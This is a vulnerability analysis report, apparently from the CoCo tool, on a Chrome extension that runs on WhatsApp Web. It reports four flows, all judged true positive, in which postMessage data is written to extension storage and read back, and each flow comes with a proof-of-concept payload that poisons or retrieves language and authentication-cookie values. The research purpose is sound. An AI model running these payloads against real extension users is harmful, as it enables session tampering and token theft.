# CoCo Analysis: bhdkkcffcbililblmbhhgbalkilpgjnn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (selectedLanguage)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bhdkkcffcbililblmbhhgbalkilpgjnn/opgen_generated_files/cs_0.js
Line 638: `mwapi.prototype.onMultiwebMsg = function (e) {`
Line 640: `window.mwapi.execute(e.data);`
Line 730: `if (e.data.type == "setLanguage") {`
Line 731: `chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () {`

**Code:**

```javascript
// content.js (Content Script) - Lines 629, 638-643
window.addEventListener('message', this.onMultiwebMsg);

mwapi.prototype.onMultiwebMsg = function (e) {
    try {
        window.mwapi.execute(e.data); // ← attacker-controlled
    } catch (e) {
        console.log(e)
    }
}

// Lines 721-733
mwapi.prototype.execute = async function (e) {
    try {
        if (e.type == "req_cookie") {
            if (e.data.type == "setLanguage") {
                chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () {
                    // ← attacker-controlled data stored
                });
                window.postMessage({ type: '_mw_language_', msg: e.data.selectedLanguage }, '*');
            }
        }
    } catch (e) {
        console.log(e)
    }
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// On https://web.whatsapp.com/* where the extension runs
window.postMessage({
    type: "req_cookie",
    data: {
        type: "setLanguage",
        selectedLanguage: "attacker_controlled_value"
    }
}, '*');
```

**Impact:** Storage poisoning with attacker-controlled language preference. While this specific flow only poisons storage, it demonstrates the extension accepts and stores arbitrary attacker data via postMessage without origin validation.

---

## Sink 2: storage_local_get_source → window_postMessage_sink (selectedLanguage)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bhdkkcffcbililblmbhhgbalkilpgjnn/opgen_generated_files/cs_0.js
Line 418: `var storage_local_get_source = { 'key': 'value' };`
Line 740: `if (items && items['selectedLanguage']) {`

**Code:**

```javascript
// content.js - Lines 736-746
if (e.data.type == "getLanguage") {
    chrome.storage.local.get(["selectedLanguage"], function (items) {
        let lang = {selectedLanguage: "pt_BR"};
        if (items && items['selectedLanguage']) {
            lang = items['selectedLanguage']; // ← previously poisoned data
        }
        window.postMessage({ type: '_mw_language_', msg: lang }, '*'); // ← sent back to attacker
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Complete storage exploitation chain

**Attack:**

```javascript
// Step 1: Poison storage
window.postMessage({
    type: "req_cookie",
    data: {
        type: "setLanguage",
        selectedLanguage: "attacker_value"
    }
}, '*');

// Step 2: Retrieve poisoned data
window.postMessage({
    type: "req_cookie",
    data: {
        type: "getLanguage"
    }
}, '*');

// Step 3: Listen for response
window.addEventListener('message', function(event) {
    if (event.data.type === '_mw_language_') {
        console.log('Retrieved poisoned data:', event.data.msg);
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can store arbitrary data and retrieve it back. Demonstrates full control over the selectedLanguage storage key.

---

## Sink 3: cs_window_eventListener_message → chrome_storage_local_set_sink (mwcookie)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bhdkkcffcbililblmbhhgbalkilpgjnn/opgen_generated_files/cs_0.js
Line 638: `mwapi.prototype.onMultiwebMsg = function (e) {`
Line 762: `chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {`

**Code:**

```javascript
// content.js - Lines 761-765
if (e.data.type == "set") {
    chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {
        // ← attacker-controlled cookie stored
    });
    window.postMessage({ type: '_mw_cookie_', msg: e.data.cookie }, '*');
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
window.postMessage({
    type: "req_cookie",
    data: {
        type: "set",
        cookie: "attacker_controlled_cookie_value"
    }
}, '*');
```

**Impact:** Storage poisoning of authentication cookie. Attacker can inject malicious cookie data into extension storage.

---

## Sink 4: storage_local_get_source → window_postMessage_sink (mwcookie)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bhdkkcffcbililblmbhhgbalkilpgjnn/opgen_generated_files/cs_0.js
Line 418: `var storage_local_get_source = { 'key': 'value' };`
Line 752: `if (items && items['mwcookie']) {`

**Code:**

```javascript
// content.js - Lines 749-757
if (e.data.type == "get") {
    chrome.storage.local.get(["mwcookie"], function (items) {
        let ck = null;
        if (items && items['mwcookie']) {
            ck = items['mwcookie']; // ← previously poisoned cookie
        }
        window.postMessage({ type: '_mw_cookie_', msg: ck }, '*'); // ← sent back to attacker
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Complete storage exploitation chain

**Attack:**

```javascript
// Complete attack: set and retrieve cookie
// Step 1: Poison storage
window.postMessage({
    type: "req_cookie",
    data: {
        type: "set",
        cookie: "Bearer attacker_token_here"
    }
}, '*');

// Step 2: Retrieve poisoned data
window.postMessage({
    type: "req_cookie",
    data: {
        type: "get"
    }
}, '*');

// Step 3: Listen for response
window.addEventListener('message', function(event) {
    if (event.data.type === '_mw_cookie_') {
        console.log('Retrieved poisoned cookie:', event.data.msg);
    }
});
```

**Impact:** Complete storage exploitation chain for authentication cookies. Attacker can poison and retrieve authentication tokens, demonstrating full control over the mwcookie storage key. This could potentially be used to hijack authentication if the extension uses this cookie for API requests.
